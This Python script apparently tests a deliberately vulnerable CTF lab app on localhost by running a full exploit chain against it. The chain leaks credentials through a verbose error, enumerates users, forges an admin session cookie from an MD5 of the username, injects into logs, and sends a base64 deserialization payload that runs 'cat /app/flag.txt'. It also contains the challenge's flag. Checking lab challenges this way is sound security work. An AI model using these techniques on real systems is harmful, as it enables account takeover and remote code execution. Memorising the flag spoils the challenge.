import requests
import base64
import sys
import hashlib

# Get port from command line arguments or use default
port = 45275 if len(sys.argv) < 2 else int(sys.argv[1])
BASE_URL = f"http://localhost:{port}"

print(f"[*] Starting robust vulnerability chain test against: {BASE_URL}\n")

# ----------------- TEST 1: OWASP #10 (Verbose Error Handling) -----------------
print("[1] Testing OWASP #10 (Verbose Error Handling via /test-db)...")
try:
    s = requests.Session()
    res = s.post(f"{BASE_URL}/test-db", allow_redirects=True)
    
    if "ConnectionError: Failed to connect to MySQL database server" in res.text:
        print("  [+] SUCCESS: Verbose error traceback successfully leaked.")
        if "/sys-admin-login" in res.text and "10.0.5.10:3306" in res.text:
            print("  [+] SUCCESS: Disclosed database credentials and hidden path.")
        else:
            print("  [-] FAIL: Failed to leak credentials/path.")
    else:
        print("  [-] FAIL: No traceback found on landing page.")
except Exception as e:
    print(f"  [-] ERROR: {e}")

# ----------------- TEST 2: OWASP #6 (Insecure Design) -----------------
print("\n[2] Testing OWASP #6 (Insecure Design via Predictable Admin Path /sys-admin-login)...")
try:
    res = requests.get(f"{BASE_URL}/sys-admin-login")
    if res.status_code == 200 and "Employee Authentication" in res.text:
        print("  [+] SUCCESS: Accessible secret login panel.")
    else:
        print(f"  [-] FAIL: Status code {res.status_code}")
except Exception as e:
    print(f"  [-] ERROR: {e}")

# ----------------- TEST 3: OWASP #7 (Identification & Authentication Failures) -----------------
print("\n[3] Testing OWASP #7 (Identification & Authentication Failures)...")
try:
    # 3a. User Enumeration check (Non-existent user)
    s = requests.Session()
    res_enum1 = s.post(f"{BASE_URL}/sys-admin-login", data={"username": "random_operator", "password": "any"}, allow_redirects=True)
    if "does not exist in our employee database" in res_enum1.text:
        print("  [+] SUCCESS: User enumeration verified (non-existent username message distinct).")
    else:
        print("  [-] FAIL: User enumeration did not return distinct non-existent message.")

    # 3b. User Enumeration check (Existent user, wrong password)
    # Jinja2 escapes single quotes as &#39; so we check for: Incorrect password for user &#39;sysadmin&#39;.
    s2 = requests.Session()
    res_enum2 = s2.post(f"{BASE_URL}/sys-admin-login", data={"username": "sysadmin", "password": "wrong_password"}, allow_redirects=True)
    if "Incorrect password for user" in res_enum2.text and "sysadmin" in res_enum2.text:
        print("  [+] SUCCESS: User enumeration verified (existent username password error distinct).")
    else:
        print("  [-] FAIL: User enumeration did not return distinct wrong password message.")

    # 3c. Predictable Cookie Session Forgery
    # MD5 hash of 'sysadmin' is '48a365b4ce1e322a55ae9017f3daf0c0' (no trailing newline)
    forged_token = "48a365b4ce1e322a55ae9017f3daf0c0"
    
    res_dash = requests.get(f"{BASE_URL}/dashboard", cookies={"session_token": forged_token})
    if "Welcome, <strong>sysadmin</strong>" in res_dash.text:
        print("  [+] SUCCESS: Session cookie forged successfully (privilege escalation to sysadmin).")
    else:
        print("  [-] FAIL: Forged token was rejected or redirected.")
except Exception as e:
    print(f"  [-] ERROR: {e}")

# ----------------- TEST 4: OWASP #9 (Security Logging & Monitoring Failures) -----------------
print("\n[4] Testing OWASP #9 (Security Logging & Monitoring Failures)...")
try:
    forged_token = "48a365b4ce1e322a55ae9017f3daf0c0"
    
    # Toggle alerts
    res_toggle = requests.post(f"{BASE_URL}/toggle-alerts", cookies={"session_token": forged_token}, allow_redirects=True)
    if "Alert status changed" in res_toggle.text:
        print("  [+] SUCCESS: Log entry recorded successfully.")
    else:
        print("  [-] FAIL: Toggle alert status failed.")
    
    # Log Injection
    injection_query = 'admin" SUCCESS: Bypass detected! ]'
    res_inject = requests.post(f"{BASE_URL}/search-logs", data={"query": injection_query}, cookies={"session_token": forged_token}, allow_redirects=True)
    if "Potential Log Injection Vulnerability detected!" in res_inject.text:
        print("  [+] SUCCESS: Log injection payload accepted and flagged.")
    else:
        print("  [-] FAIL: Log injection warning message not triggered.")
except Exception as e:
    print(f"  [-] ERROR: {e}")

# ----------------- TEST 5: OWASP #8 (Software & Data Integrity Failures) -----------------
print("\n[5] Testing OWASP #8 (Software & Data Integrity Failures via Deserialization RCE)...")
try:
    forged_token = "48a365b4ce1e322a55ae9017f3daf0c0"
    
    # Base64 encode JSON config: {"name": "rce", "cmd": "cat /app/flag.txt"}
    payload_json = '{"name": "rce", "cmd": "cat /app/flag.txt"}'
    b64_payload = base64.b64encode(payload_json.encode()).decode()
    
    res_rce = requests.post(f"{BASE_URL}/load-plugin", data={"payload": b64_payload}, cookies={"session_token": forged_token}, allow_redirects=True)
    if "CTF{owasp_part2_compl3t3_chain_auth_integrity_errors_design_logging}" in res_rce.text:
        print("  [+] SUCCESS: Master flag successfully read via RCE payload.")
    else:
        print("  [-] FAIL: Master flag not returned in plugin execution output.")
except Exception as e:
    print(f"  [-] ERROR: {e}")

print("\n[*] Tests complete.")
